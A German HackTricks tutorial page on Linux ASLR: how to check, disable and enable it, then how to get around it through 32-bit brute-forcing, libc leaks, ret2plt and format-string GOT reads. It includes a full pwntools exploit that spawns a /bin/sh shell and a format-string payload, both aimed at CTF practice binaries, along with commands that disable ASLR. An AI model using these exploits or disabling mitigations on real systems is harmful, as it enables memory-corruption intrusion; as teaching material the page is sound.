# ASLR

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Grundlegende Informationen

**Address Space Layout Randomization (ASLR)** ist eine Sicherheitstechnik, die in Betriebssystemen verwendet wird, um die **Speicheradressen zu randomisieren**, die von System- und Anwendungsprozessen verwendet werden. Dadurch wird es f√ºr einen Angreifer erheblich schwieriger, den Ort bestimmter Prozesse und Daten vorherzusagen, wie z. B. den Stack, den Heap und Bibliotheken, wodurch bestimmte Arten von Exploits, insbesondere Puffer√ºberl√§ufe, abgemildert werden.

### **√úberpr√ºfen des ASLR-Status**

Um den ASLR-Status auf einem Linux-System zu **√ºberpr√ºfen**, k√∂nnen Sie den Wert aus der Datei `/proc/sys/kernel/randomize_va_space` lesen. Der in dieser Datei gespeicherte Wert bestimmt den Typ des angewendeten ASLR:

* **0**: Keine Randomisierung. Alles ist statisch.
* **1**: Konservative Randomisierung. Gemeinsam genutzte Bibliotheken, Stack, mmap(), VDSO-Seite werden randomisiert.
* **2**: Vollst√§ndige Randomisierung. Zus√§tzlich zu den Elementen, die durch konservative Randomisierung randomisiert werden, wird der durch `brk()` verwaltete Speicher randomisiert.

Sie k√∂nnen den ASLR-Status mit folgendem Befehl √ºberpr√ºfen:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktivieren von ASLR**

Um ASLR zu **deaktivieren**, setzen Sie den Wert von `/proc/sys/kernel/randomize_va_space` auf **0**. Das Deaktivieren von ASLR wird im Allgemeinen au√üerhalb von Test- oder Debugging-Szenarien nicht empfohlen. So k√∂nnen Sie es deaktivieren:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Sie k√∂nnen ASLR auch f√ºr eine Ausf√ºhrung deaktivieren mit:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivierung von ASLR**

Um ASLR zu **aktivieren**, k√∂nnen Sie einen Wert von **2** in die Datei `/proc/sys/kernel/randomize_va_space` schreiben. Dies erfordert in der Regel Root-Berechtigungen. Die vollst√§ndige Zufallsauswahl kann mit dem folgenden Befehl durchgef√ºhrt werden:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenz √ºber Neustarts hinweg**

√Ñnderungen, die mit den `echo`-Befehlen vorgenommen werden, sind vor√ºbergehend und werden beim Neustart zur√ºckgesetzt. Um die √Ñnderung dauerhaft zu machen, m√ºssen Sie die Datei `/etc/sysctl.conf` bearbeiten und die folgende Zeile hinzuf√ºgen oder √§ndern:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Nachdem du `/etc/sysctl.conf` bearbeitet hast, wende die √Ñnderungen mit an:
```bash
sudo sysctl -p
```
Dies stellt sicher, dass Ihre ASLR-Einstellungen √ºber Neustarts hinweg bestehen bleiben.

## **Umgehungen**

### 32-Bit-Brute-Forcing

PaX teilt den Prozess-Adressraum in **3 Gruppen** auf:

* **Code und Daten** (initialisiert und nicht initialisiert): `.text`, `.data` und `.bss` ‚Äî> **16 Bits** Entropie in der Variablen `delta_exec`. Diese Variable wird mit jedem Prozess zuf√§llig initialisiert und zu den Anfangsadressen hinzugef√ºgt.
* **Speicher**, der von `mmap()` allokiert wurde, und **gemeinsam genutzte Bibliotheken** ‚Äî> **16 Bits**, genannt `delta_mmap`.
* **Der Stack** ‚Äî> **24 Bits**, bezeichnet als `delta_stack`. Es werden jedoch effektiv **11 Bits** verwendet (vom 10. bis zum 20. Byte einschlie√ülich), ausgerichtet auf **16 Bytes** ‚Äî> Dies ergibt **524.288 m√∂gliche reale Stack-Adressen**.

Die vorherigen Daten gelten f√ºr 32-Bit-Systeme, und die reduzierte endg√ºltige Entropie erm√∂glicht es, ASLR zu umgehen, indem der Angriff so oft wiederholt wird, bis er erfolgreich abgeschlossen ist.

#### Ideen f√ºr Brute-Force:

* Wenn der Angriff lokal ist, k√∂nnen Sie versuchen, die Basisadresse von libc per Brute-Force zu ermitteln (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, die Adresse der `libc`-Funktion `usleep` durch **Brute-Force** zu ermitteln und dabei 10 als Argument zu √ºbergeben. Wenn der Server zu einem bestimmten Zeitpunkt **10 Sekunden l√§nger braucht, um zu antworten**, haben Sie die Adresse dieser Funktion gefunden.

{% hint style="success" %}
Bei 64-Bit-Systemen ist die Entropie viel h√∂her und dies ist nicht m√∂glich.
{% endhint %}

### Wenn ein Leak vorhanden ist

* **Die Herausforderung besteht darin, einen Leak zu erhalten**

Wenn Ihnen ein Leak vorliegt (einfache CTF-Herausforderungen), k√∂nnen Sie davon Offsetwerte berechnen (angenommen, Sie kennen beispielsweise die genaue libc-Version, die im System verwendet wird, das Sie ausnutzen). Dieses Beispiel-Exploit wird aus dem [**Beispiel hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) extrahiert (√ºberpr√ºfen Sie diese Seite f√ºr weitere Details):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Durch Ausnutzen eines Puffer√ºberlaufs w√§re es m√∂glich, ein **ret2plt** zu nutzen, um die Adresse einer Funktion aus der libc zu exfiltrieren. √úberpr√ºfen Sie:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Genau wie bei ret2plt, wenn Sie √ºber eine Schwachstelle bei Formatzeichenfolgen einen beliebigen Lesezugriff haben, ist es m√∂glich, die Adresse einer **libc-Funktion** aus dem GOT zu exfiltrieren. Das folgende [**Beispiel stammt von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Du kannst weitere Informationen √ºber das willk√ºrliche Lesen von Formatzeichenfolgen finden in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret

Versuche ASLR zu umgehen, indem du Adressen innerhalb des Stacks missbrauchst:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
